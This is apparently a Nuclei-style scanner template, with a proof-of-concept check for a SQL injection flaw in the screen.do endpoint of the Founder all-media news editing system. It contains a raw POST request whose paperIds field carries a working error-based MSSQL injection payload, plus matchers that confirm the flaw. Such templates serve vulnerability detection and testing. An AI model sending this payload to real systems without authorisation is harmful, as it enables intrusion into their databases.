id: poc-yaml-founder-newsedit-screen-do-sqli
info:
  name: 方正全媒体采编系统 screen.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /newsedit/newsplan/screen.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        method=getPaperLayoutList&pageNo=1&pageSize=5&paperDate=2022-11-30&paperIds=-1)+and+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+&terminalType=123
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "在将 nvarchar 值"
          - "报道中心"
          - "转换成数据类型 int 时失败"
      - type: dsl
        dsl:
          - contains(body, concat("0x", t2))
